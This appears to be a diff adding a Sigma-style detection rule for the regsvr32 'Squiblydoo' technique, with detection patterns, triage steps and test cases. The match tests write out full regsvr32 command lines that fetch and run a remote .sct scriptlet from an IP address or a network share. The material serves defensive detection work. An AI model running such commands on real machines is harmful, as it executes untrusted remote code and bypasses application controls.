@@ -1,0 +1,28 @@
+id: DL-0005
+title: regsvr32 loads a remote scriptlet (Squiblydoo)
+description: >
+  regsvr32 with /i:<URL> and scrobj.dll fetches and runs a COM scriptlet from the internet.
+  The technique is called Squiblydoo. Legitimate COM registration never points at a URL.
+attack: [T1218.010]
+tactic: execution
+severity: high
+logsource: process_creation
+detection:
+  selection:
+    process.name: regsvr32.exe
+    process.command_line|contains: ['/i:http', '-i:http', 'scrobj.dll', '/i:\\', '-i:\\']
+  condition: selection
+false_positives:
+  - None expected. Investigate every hit.
+triage:
+  - Pull the scriptlet URL and analyse the .sct content.
+  - Check for child processes of regsvr32 and outbound connections.
+tests:
+  match:
+    - process.name: regsvr32.exe
+      process.command_line: 'regsvr32 /s /n /u /i:http://203.0.113.9/file.sct scrobj.dll'
+    - process.name: regsvr32.exe
+      process.command_line: 'regsvr32.exe -s -u -i:\\10.0.0.5\share\x.sct scrobj.dll'
+  no_match:
+    - process.name: regsvr32.exe
+      process.command_line: 'regsvr32.exe /s C:\Program Files\Vendor\component.dll'
